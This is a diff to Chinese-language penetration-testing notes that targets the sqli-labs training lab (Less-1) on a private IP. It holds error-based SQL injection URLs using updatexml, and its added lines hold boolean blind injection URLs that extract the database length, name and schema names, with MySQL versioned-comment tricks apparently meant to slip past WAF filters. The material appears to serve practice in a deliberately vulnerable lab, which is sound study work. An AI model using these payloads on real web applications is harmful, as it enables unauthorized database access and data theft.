@@ -24,3 +24,8 @@ from `information_schema`.tables WHERE TABLE_SCHEMA=database(/*!60000abc*/)),3%2
 报错注入当前数据库
 http://192.168.244.137/sqli-lab/Less-1/?id=1' and `updatexml`(1,concat(0x7e,(select unhex(hex(SCHEMA_NAME)) from `information_schema`.SCHEMATA limit 1,1),0x7e),1)-- +
 报错注入获取所有数据库
+10、布尔盲注
+a、获取数据库长度：http://192.168.244.137/sqli-lab/Less-1/?id=1' and (/*!60000select*/ length(database/*!77777*/()))=/*!500008*/ and /*!500001*/ = /*!500001*/ --+
+b、获取当前数据库字符串：http://192.168.244.137/sqli-lab/Less-1/?id=1' and (/*!60000select*/ ord(substring(database/*!77777*/(),1,1))) =/*!5000098*/ and /*!500001*/ = /*!500001*/ --+
+c、获取数据库：http://192.168.244.137/sqli-lab/Less-1/?id=1' and (/*!60000select*/ ord(substring((select unhex(hex(SCHEMA_NAME)) from `information_schema`.SCHEMATA limit 1,1),1,1))) =/*!5000098*/ and /*!500001*/ = /*!500001*/ --+
+d、列和表同理
